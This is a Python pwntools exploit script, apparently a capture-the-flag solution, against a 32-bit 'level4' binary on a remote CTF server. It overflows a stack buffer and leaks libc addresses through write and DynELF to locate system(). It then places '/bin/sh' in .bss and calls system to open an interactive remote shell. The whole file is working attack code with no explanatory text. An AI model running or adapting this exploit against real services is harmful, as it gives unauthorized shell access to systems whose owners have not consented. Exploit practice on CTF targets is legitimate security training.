from pwn import *

#context.log_level = 'debug'

#r = process("./level4")
r = remote("pwn2.jarvisoj.com", 9880)
e = ELF("./level4")
#gdb.attach(r)


write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]


def leak(address):
    payload = 'a' * (0x88 + 4) + p32(write_plt) + p32(main) + p32(1) + p32(address) + p32(4)
    r.send(payload)
    date = r.recv(4)
    return date
d = DynELF(leak, elf=e)


sys_add = d.lookup('system', 'libc')
print hex(sys_add)


bss_add = 0x0804A026
read_plt = e.plt['read']
pay = 'a' * (0x88 + 4) + p32(read_plt) + p32(main) + p32(0) + p32(bss_add) + p32(8)
r.sendline(pay)
r.send("/bin/sh\x00")


pay = 'a' * (0x88 + 4) + p32(sys_add) + 'aaaa' + p32(bss_add)
r.sendline(pay)


r.interactive()



